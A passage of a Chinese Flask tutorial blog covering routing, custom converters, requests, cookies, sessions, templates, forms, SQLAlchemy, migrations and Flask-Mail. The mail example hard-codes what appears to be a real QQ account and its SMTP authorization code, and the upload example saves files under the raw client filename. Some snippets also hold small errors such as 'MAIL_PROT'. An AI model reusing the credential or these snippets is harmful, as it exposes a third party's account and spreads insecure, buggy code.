如果某些视图只能用某些请求方式来访问，那么方法就是:@app.route(‘路径’, methods=[请求方式列表])</p>\n<p>  当有多个视图对应同一个url地址的时候，解决方法是：要么修改url,要么修改请求方式</p>\n<p>  当有多个url地址对应一个视图函数的时候(给视图函数多装几个装饰器)，那么就是说这多个url都可以访问这个视图</p>\n<p>  重定向:从flask中导入redirect模块，就可以实现重定向(跳转，两次请求，重定向状态码302),用法:return redirect(url地址)</p>\n<p>  反向解析: 从flask中导入url_for模块,就可以实现反向解析，用法: url = url_for(‘视图函数的名字’, 参数列表)</p>\n</blockquote>\n<h4 id=\"url带参数\"><a href=\"#url带参数\" class=\"headerlink\" title=\"url带参数\"></a>url带参数</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">@app.route('/路径/&lt;转换器类型:参数名>'):\n    已经实现的转换器类型: int , float , path,如:@app.route('/index/&lt;int:id>'),在访问的时候:127.0.0.1:5000://index/123就可以访问.\n    不加转换器类型就是表示匹配普通的字符串（除了/）:@app.route('/路径/&lt;参数名>')\n    int转换器类型，匹配整数\n    float转换器类型，匹配小数\n    path转换器类型，匹配字符串，但是包括/\n        @app.route('/goods/&lt;int:id>')\n        def goods_detail(id):\n                '''定义商品视图函数'''\n            return f'goods detail page&#123;id&#125;'\n\n    自定义转换器(三步):\n        1、定义自己的转换器:\n            导入from werkzeug.routing import BaseConverter。\n            定义一个转换器类，使其继承BaseConverter.\n        2、将自定义的转换器添加到flask的应用中:\n            app.url_map.converters['转换器名'] = 类名\n        3、使用:\n            @app.route('/路径/&lt;转换器类型:参数名>')<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"定义万能转换器\"><a href=\"#定义万能转换器\" class=\"headerlink\" title=\"定义万能转换器\"></a>定义万能转换器</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">说明一点:转换器也可以跟参数（re）: @app.route('/路径/&lt;转换器类型(参数):参数名>')\n方式一、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map, regex):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = regex\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/&lt;re(r'1[34578]\\d&#123;9&#125;'):id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page&#123;id&#125;'\n方式二、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = r'1[34578]\\d&#123;9&#125;'\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/&lt;re:id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page&#123;id&#125;'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"高级的转换器应用\"><a href=\"#高级的转换器应用\" class=\"headerlink\" title=\"高级的转换器应用\"></a>高级的转换器应用</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">class ReConverter(BaseConverter):\n    '''\n        re万能转换器\n        创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n        在视图函数使用的时候，可以跟参数，一个正则\n        工作原理:\n            在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n    '''\n\n    # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n    def __init__(self, url_map):\n        super().__init__(url_map)\n        # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n        # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n        self.regex = r'1[34578]\\d&#123;9&#125;'\n\n    '''\n        to_python和to_url都是父类中的方法:\n            to_python:在匹配成功以后，请求网址带来的参数会交给to_python做出处理，返回的结果为视图函数的参数\n            to_url:在使用重定向(url_for)的时候使用，url(\"视图名\",参数)\n            使用重定向的时候，被定向的视图函数如果有参数需要匹配，那么，在重定向的时候，在使用url_for()的时候，就会去匹配一次被定向视图使用的转换器，在匹配成功的同时调用to_url方法\n            在to_url中处理以后，会交给to_python处理\n\n    '''\n\n    def to_python(self, value):\n        return value\n\n    def to_url(self, value):\n        return '13443218888'\n\n\n# 加到应用中\napp.url_map.converters['re'] = ReConverter\n\n\n@app.route(\"/goods/&lt;re:id>\")\ndef goods_detail(id):\n    '''定义商品视图函数'''\n    return f'goods detail page&#123;id&#125;'\n\n\n@app.route(\"/index\")\ndef index():\n    url = url_for(\"goods_detail\", id=13412344321)\n    return redirect(url)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Request对象\"><a href=\"#Request对象\" class=\"headerlink\" title=\"Request对象\"></a>Request对象</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">从flask中导入request和Response\nrequest中常用的属性:\n    data:获取请求的数据，并转换为字符串，request.data\n    form:获取请求中的表单数据,request.form.get()，获取一对一,request.form.getlist()，获取一对多的数据\n    args:获取url中的参数(http:x.x.x.x:xxx/xxx?city=chengdu)，\n    cookies:获取到cookie，request.cookies.get()\n    headers:获取请求头中的报文:request.headers\n    method:获取请求方式:request.method\n    url:获取请求的url:request.url\n    files:获取上传的文件:  if request.method == 'POST':\n                            file = request.files.get('pic')\n                            file.save(f'./img/&#123;file.filename&#125;')\n    path: 拿到浏览器请求的地址（视图）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"abort\"><a href=\"#abort\" class=\"headerlink\" title=\"abort\"></a>abort</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">从flask中导入abort\n无条件终止视图函数的执行，并返回给前端特定的信息\n用法一、\n    abort（状态码）\n用法二、\n    re &#x3D; Response(&quot;login defete&quot;)\n    abort(re)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"自定义错误信息\"><a href=\"#自定义错误信息\" class=\"headerlink\" title=\"自定义错误信息\"></a>自定义错误信息</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">用户访问的页面不错在的时候，定义一个独立的视图,用@app.errorheader(404)来装饰\n固定写法:\n    @app.errorhandler(404)\n    def header_error(err):\n         return &#39;没有&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"设置响应信息的方法\"><a href=\"#设置响应信息的方法\" class=\"headerlink\" title=\"设置响应信息的方法\"></a>设置响应信息的方法</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">从flask中导入make_response\n方法一:\n    使用:\n    rsp &#x3D; make_response(显示的字符串)\n    rsp.status &#x3D; &#39;999 lqs&#39;  状态码\n    rsp.headers[&#39;lqs&#39;] &#x3D; &#39;lqs&#39;   头信息\n    return rsp\n方法二:\n    return 显示字符串, 状态码, 头信息<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"json\"><a href=\"#json\" class=\"headerlink\" title=\"json\"></a>json</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">方法一、import json\n    dic &#x3D; &#123;&quot;name&quot;: &quot;lqs&quot;, &quot;age&quot;: 12&#125;\n    json_str &#x3D; json.dumps(dic)\n    print(type(json_str))\n    print(json_str)\n    dic_str &#x3D; json.loads(json_str)\n    print(type(dic_str))\n    print(dic_str)\njson.dumps():字典转json字符串\njson.loads():json字符串转字典\n\n方法二、从flask中导入jsonify\n    return jsonify(dic) ：将字典转成json字符串，并且自动设置头信息<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"cookie的读写\"><a href=\"#cookie的读写\" class=\"headerlink\" title=\"cookie的读写\"></a>cookie的读写</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">读写和django一样，都是通过response写入，通过request读取\n在有关cookie的操作中，都要 app.config[&quot;SECRET_KEY&quot;] &#x3D; xxxxxx\n    导入:from flask import make_response\n    实例化:resp &#x3D; make_response(显示字符串)\n    设置:resp.set_cookie(&quot;lqs&quot;, &quot;Flask&quot;, max_age&#x3D;3600)\n    读取:request.cookies.get(&#39;lqs&#39;)\n    删除:resp.delete_cookie(&#39;lqs&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"session的读写\"><a href=\"#session的读写\" class=\"headerlink\" title=\"session的读写\"></a>session的读写</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">导入: from flask import session\n设置: session[key] &#x3D; value\n读取: session.get(key)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"钩子\"><a href=\"#钩子\" class=\"headerlink\" title=\"钩子\"></a>钩子</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">类似于django中的中间件\n在请求的时候使用，不是任何请求都会调用，是调用到视图函数的时候，在之前或者之后进行操作\n@app.before_first_request : 第一次请求之前调用\n@app.before_request : 每次请求之前调用\n@app.after_request : 每次请求之后调用（视图函数没有出错的情况）\n@app.teardown_request : 每次请求之后调用（不论是否出错都会调用）\n\n@app.after_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西\n@app.teardown_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"g对象\"><a href=\"#g对象\" class=\"headerlink\" title=\"g对象\"></a>g对象</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">from flask import g\ng对象中保存的数据，在一次请求中的，多个函数中可以使用\n使用:\n    g.key &#x3D; value:存\n    xx &#x3D; g.key:取<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask-script扩展-实现shell代码-这样子可以和django一样，runserver\"><a href=\"#flask-script扩展-实现shell代码-这样子可以和django一样，runserver\" class=\"headerlink\" title=\"flask_script扩展(实现shell代码),这样子可以和django一样，runserver\"></a>flask_script扩展(实现shell代码),这样子可以和django一样，runserver</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install Flask-Script\nfrom flask_script import Manager\nmanager &#x3D; Manager(flask应用名)\nmanager.run()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask使用模板文件\"><a href=\"#flask使用模板文件\" class=\"headerlink\" title=\"flask使用模板文件\"></a>flask使用模板文件</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">from flask import render_template\nreturn render_template(&quot;html模板&quot;, key&#x3D;value, key&#x3D;value)  或者    return render_template(&quot;html模板&quot;, **字典名（组织之后的上下文）)\n在html模板文件中，可以使用过滤器:使用方法:&#123;&#123;value | 过滤器&#125;&#125;如safe就表示转义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask中html模板转义\"><a href=\"#flask中html模板转义\" class=\"headerlink\" title=\"flask中html模板转义\"></a>flask中html模板转义</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">使用方法: &#123;&#123; 处理对象 | 过滤器 &#125;&#125;\n常用过滤器:\n    safe : 禁用转义\n    capitalize : 变量值的首字母转换成大写其余小写\n    lower : 全部转换为小写\n    upper : 全部转换为大写\n    title : 每个单词首字母大写\n    trim  : 去除首尾空格\n    reverse : 字符串反转\n    format : 格式化输出\n    striptags : 渲染之前把所有的html标签去掉\n    first : 取出列表中的第一个元素\n    last : 取出列表中的最后一个元素\n    length : 获取列表的长度\n    sum : 列表数据求和\n    sort : 列表排序\n自定义过滤器:\n    在flask代码中定义\n    第一种方式(函数):\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        app.add_template_filter(函数名, 过滤器名)就可以注册这个过滤器\n        然后在html模板中使用\n    第二种方式(装饰器:\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        加装饰器:@app.template_filter(过滤器名)\n        然后在html模板中使用\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask使用Flask-WTF\"><a href=\"#flask使用Flask-WTF\" class=\"headerlink\" title=\"flask使用Flask-WTF\"></a>flask使用Flask-WTF</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">可以在服务器端(创建表单模型)校验表单数据，可以设置csrf攻击的关闭\npip install Flask-WTF\nfrom flask_wtf import FlaskForm : 这个模块让类继承之后就可以实现创建表单模型\nfrom wtforms import StringField, PasswordField, SubmitField : 这个wtforms模块中的方法都是关于表单中的各个控件的类型，这里没有写全面\nfrom wtforms.validators import DataRequired, EqualTo : wtforms下面的validators模块中的方法就是一些校验规则\n\n说明: 在flask中定义的表单模型作用有两个,首先，第一个作用就是不用用户再去自己打表单，可以将表单模型传到模板中生成表单，第二个作用就是验证数据，两个作用是区分开的\n\n定义表单模型类:\n    class LoginForm(FlaskForm):\n    &#39;&#39;&#39;\n        自定义的注册表单抽象类\n            label标签表示设置名称,用中文就使用u&quot;xx&quot;\n            validators表示验证数据，是一个列表类型\n            DataRequired表示必须输入，有一个参数，表示验证失败的时候显示文本\n            EqualTo表示和谁一样，有连个参数，第一个填写和谁一样，第二个填写验证失败的显示文本\n    &#39;&#39;&#39;\n        user_name &#x3D; StringField(label&#x3D;u&quot;用户名&quot;, validators&#x3D;[DataRequired(&quot;用户名不能为空&quot;)])\n        password &#x3D; PasswordField(label&#x3D;r&quot;密码&quot;, validators&#x3D;[DataRequired(&quot;密码不能为空&quot;)])\n        password2 &#x3D; PasswordField(label&#x3D;r&quot;确认密码&quot;, validators&#x3D;[DataRequired(&quot;确认密码不能为空&quot;), EqualTo(&quot;password&quot;, &quot;两次密码不一致&quot;)])\n        submit &#x3D; SubmitField(label&#x3D;u&quot;提交&quot;)\n\n\n        @app.route(&quot;&#x2F;login&quot;, methods&#x3D;[&quot;POST&quot;, &quot;GET&quot;])\n        def login():\n            &#39;&#39;&#39;创建表单对象&#39;&#39;&#39;\n            form &#x3D; LoginForm()\n            # 判断form中的数据是否合理\n            # 如果form中的数据完全满足验证，则返回真，否则返回假\n            if form.validate_on_submit():\n                uname &#x3D; form.user_name.data\n                pwd &#x3D; form.password.data\n                pwd2 &#x3D; form.password2.data\n                print(uname, pwd, pwd2)\n                session[&quot;username&quot;] &#x3D; uname\n                url &#x3D; url_for(&quot;index&quot;)\n                return redirect(url)\n            return render_template(&quot;login.html&quot;, form&#x3D;form)\n\n\n在html模板中生成表单:\n     &lt;form  method&#x3D;&quot;post&quot;&gt;\n        &#123;&#123; form.csrf_token&#125;&#125;\n        &#123;&#123; form.user_name.label &#125;&#125; &#123;&#123; form.user_name &#125;&#125;&lt;br&gt;\n        &#123;% for msg in form.user_name.errors %&#125;\n        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;p&gt;\n        &#123;% endfor %&#125;\n\n        &#123;&#123; form.password.label &#125;&#125; &#123;&#123; form.password &#125;&#125;&lt;br&gt;\n        &#123;% for msg in form.password.errors %&#125;\n        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;p&gt;\n        &#123;% endfor %&#125;\n\n        &#123;&#123; form.password2.label &#125;&#125; &#123;&#123; form.password2 &#125;&#125;&lt;br&gt;\n        &#123;% for msg in form.password2.errors %&#125;\n        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;p&gt;\n        &#123;% endfor %&#125;\n\n        &lt;p&gt;&#123;&#123; form.submit &#125;&#125;&lt;&#x2F;p&gt;\n\n     &lt;&#x2F;form&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"宏的定义和使用\"><a href=\"#宏的定义和使用\" class=\"headerlink\" title=\"宏的定义和使用\"></a>宏的定义和使用</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在同一个html中定义和使用:\n    没有参数:\n        定义:\n        &#123;% macro input() %&#125;\n         &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;&quot; value&#x3D;&quot;&quot; size&#x3D;&quot;30&quot;&gt;\n        &#123;% endmacro %&#125;\n        使用:\n        &#123;&#123; input() &#125;&#125;\n    有参数:\n    定义:\n    &#123;% macro input(type,name,size) %&#125;\n     &lt;input type&#x3D;&#123;&#123;type&#125;&#125; name&#x3D;&#123;&#123;name&#125;&#125; value&#x3D;&quot;&quot; size&#x3D;&#123;&#123;size&#125;&#125;&gt;\n    &#123;% endmacro %&#125;\n    使用:\n    &#123;&#123; input(&#39;text&#39;, &#39;username&#39;, 40) &#125;&#125;\n\n在不同html中定义和使用:\n    没有参数:\n        定义在macro2.html中:\n        &#123;% macro input() %&#125;\n         &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;&quot; value&#x3D;&quot;&quot; size&#x3D;&quot;30&quot;&gt;\n        &#123;% endmacro %&#125;\n        在macro。html使用:\n        &#123;% import &quot;macro2.html&quot; as 别名 %&#125;\n        &#123;&#123; 别名.input() &#125;&#125;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"模板继承\"><a href=\"#模板继承\" class=\"headerlink\" title=\"模板继承\"></a>模板继承</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">和django中的模板继承一样: &#123;% extend &quot;模板名&quot; %&#125;  使用 &#123;% block xx %&#125; &#123;% endblock xx %&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"flask中一些特殊的方法\"><a href=\"#flask中一些特殊的方法\" class=\"headerlink\" title=\"flask中一些特殊的方法\"></a>flask中一些特殊的方法</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">有些方法和变量不需要传递也可以在模板中直接使用\nconfig中的方法\nrequest中的方法\nurl_for中的方法\n模板的闪现:\n    闪现就是表示有的信息，只是出现一次\n    在flask中:from flask import flash\n            在视图中使用flash(xxx)来添加信息，可以添加很多条\n    在模板中:\n        &#123;% for x in get_flashed_messages() %&#125;\n        &#123;&#123; x &#125;&#125;\n        &#123;% endfor %&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask链接数据库\"><a href=\"#flask链接数据库\" class=\"headerlink\" title=\"flask链接数据库\"></a>flask链接数据库</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install flask-sqlalchemy  模型类到sql语句的转换，再将结果转换为模型类对象\npip install flask-mysqldb   数据库驱动\nfrom flask_sqlalchemy import SQLAlchemy  可以创建数据库对象\n配置:\n    app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] &#x3D; &quot;mysql:&#x2F;&#x2F;root:123456@127.0.0.1:3306&#x2F;msfood&quot;\n    app.config[&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;] &#x3D; True   # 配置跟踪,数据库和模型类同步\n创建数据库sqlalchemy工具对象,就可以使用数据库了\n    db &#x3D; SQLAlchemy(app)\n\n\n创建模型类\nclass Role(db.Model):\n    &#39;&#39;&#39;身份表&#39;&#39;&#39;\n    __tablename__ &#x3D; &quot;tbl_roles&quot;  # 指明表名\n    id &#x3D; db.Column(db.Integer, primary_key&#x3D;True)\n    name &#x3D; db.Column(db.String(32), unique&#x3D;True)\n    users &#x3D; db.relationship(&quot;User&quot;, backref&#x3D;&quot;role&quot;)\n     def __repr__(self):\n        &#39;&#39;&#39;补充方法,可以让显示对象的时候更直观,类似于__str__方法&#39;&#39;&#39;\n        return f&#39;&#123;self.users&#125;&#39;\nclass User(db.Model):\n    &#39;&#39;&#39;用户表&#39;&#39;&#39;\n    __tablename__ &#x3D; &quot;tbl_users&quot;  # 指明数据库的表名\n    id &#x3D; db.Column(db.Integer, primary_key&#x3D;True)  # 主键，自动递增\n    name &#x3D; db.Column(db.String(64), unique&#x3D;True)\n    email &#x3D; db.Column(db.String(128), unique&#x3D;True)\n    password &#x3D; db.Column(db.String(128))\n    role_id &#x3D; db.Column(db.Integer, db.ForeignKey(&quot;tbl_roles.id&quot;))\n\n生成数据表:\n    *第一次生成的时候清除所有数据:\n         db.drop_all()\n    创建所有表\n        db.create_all()\n\n说明:\n    创建表的时候，和底层相关，只要是表中的一行，都是有关底层的，用的都是真实的表的名字\n    users &#x3D; db.relationship(&quot;User&quot;, backref&#x3D;&quot;role&quot;): 这个语句就是表示和底层无关，只和flask中的对象有关，User就是一个模型对象\n        users表和roles表是有关联的（外键）,那么db.relationship就可以让两个表相互拿东西，表示从User模型类中拿出和Role模型有关联的数据\n        backref表示没有定义relationship的对方表中，也可以反推拿出和User模型有关的Role模型的数据\n        使用方法:\n            在Role模型:role.users\n            在user模型中:user.role\n\n添加数据:\n    创建对象:xx &#x3D; 模型(属性&#x3D;值，属性&#x3D;值)\n    session记录对象任务:db.session.add(xx),添加一条数据，db.session.add_all(),添加多条数据\n    提交任务到数据库:db.session.commit()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"sqlalchemy查询\"><a href=\"#sqlalchemy查询\" class=\"headerlink\" title=\"sqlalchemy查询\"></a>sqlalchemy查询</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">用模型类来查询\n模型类.query.all():查询所有数据，返回的是一个列表，可以取出某一个对象，然后读取属性值\n模型类.query.first():返回第一条记录\n模型类.query.get(主键的id):根据主键id获取对象\n模型类.query.filter_by(字段&#x3D;xx,字段&#x3D;&#x3D;xx).all():获取满足条件的所有数据,条件是与\n模型类.query.filter(模型类.字段&#x3D;&#x3D;xx,模型类.字段&#x3D;&#x3D;xx).all():拿出满足条件的所有数据，条件是与\n模型类.query.filter(or_(模型类.字段&#x3D;&#x3D;xx,模型类.字段.endswith(xxx))).all():拿出满足条件的所有数据，条件是或，使用或必须导入from sqlalchemy import or_\n模型类.query.filter(条件).offset(2).limit(3).order_by(模型类.字段.desc()).all():返回满足条件并且忽略前两条数据，取出三条数据然后降序排列的数据，每一个部分都可以单独使用\ndb.session.query(模型类.字段, func.count(模型类.字段)).group_by(模型类.字段).all():分组查询，from sqlalchemy import func,func.聚合函数(属性),就可以查出来<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"sqlalchemy修改\"><a href=\"#sqlalchemy修改\" class=\"headerlink\" title=\"sqlalchemy修改\"></a>sqlalchemy修改</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">模型类.query.filter(条件).update(&#123;字段名:值,字段名:值,字段名:值&#125;)\ndb.session.commit()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h4 id=\"sqlalchemy删除\"><a href=\"#sqlalchemy删除\" class=\"headerlink\" title=\"sqlalchemy删除\"></a>sqlalchemy删除</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">xx &#x3D; 模型类.query.get(x)\ndb.session.delete(xx)\ndb.session.commit()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"flask中和django一样使用迁移的方式\"><a href=\"#flask中和django一样使用迁移的方式\" class=\"headerlink\" title=\"flask中和django一样使用迁移的方式\"></a>flask中和django一样使用迁移的方式</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install flask-migrate\nfrom flask_script import Manager\nfrom flask_migrate import Migrate, MigrateCommand\n\ndb &#x3D; SQLAlchemy(app)\n\n创建flask脚本管理工具\nmanager &#x3D; Manager(app)\n创建数据库迁移工具对象\nMigrate(app, db)\n向manager对象中添加数据的操作命令\nmanager.add_command(&quot;操作的名字&quot;, MigrateCommand)\n\nmain中:\n    manager.run()\n终端中:\n    python3 xxx.py 操作的名字 init  : 让他初始化一下，自动创文件夹\n    python3 xxx.py 操作的名字 migrate -m &quot;版本说明信息&quot; : 生成迁移文件（版本说明可以不要），同价与django中的makemigrations\n    多次migrate之后需要更新数据库:python3 xxx.py 操作的名字 upgrade，可以升级同步\n    python3 xxx.py 操作的名字 history : 查看历史修改\n    python3 xxx.py 操作的名字 downgrade 版本编号 : 版本回退\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"flask发送邮件\"><a href=\"#flask发送邮件\" class=\"headerlink\" title=\"flask发送邮件\"></a>flask发送邮件</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install flask-mail\nfrom flask_mail import Mail, Message\napp &#x3D; Flask(__name__)\n\napp.config.update(\n    DEBUG&#x3D;True,\n    MAIL_SERVER&#x3D;&#39;smtp.qq.com&#39;,\n    MAIL_PROT&#x3D;465,\n    MAIL_USE_TLS&#x3D;True,\n    MAIL_USERNAME&#x3D;&#39;749062870@qq.com&#39;,\n    MAIL_PASSWORD&#x3D;&#39;kttumcufpqasbcii&#39;,\n)\n\n # sender发送方,recipients接收方列表\n    mail &#x3D; Mail() : 创建mail对象\n    mail.init_app(app) : 初始化mail对象\n    msg &#x3D; Message(&quot;傻逼&quot;, sender&#x3D;&quot;749062870@qq.com&quot;, recipients&#x3D;[&quot;2807175480@qq.com&quot;]) : 设置邮件消息的邮件头\n    msg.body &#x3D; &quot;傻逼&quot;  : 设置邮件的正文\n    mail.send(msg) : 发送邮件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"蓝图（Blueprint）\"><a href=\"#蓝图（Blueprint）\" class=\"headerlink\" title=\"蓝图（Blueprint）\"></a>蓝图（Blueprint）</h3><pre class=\"line-numbers language-none\"><code 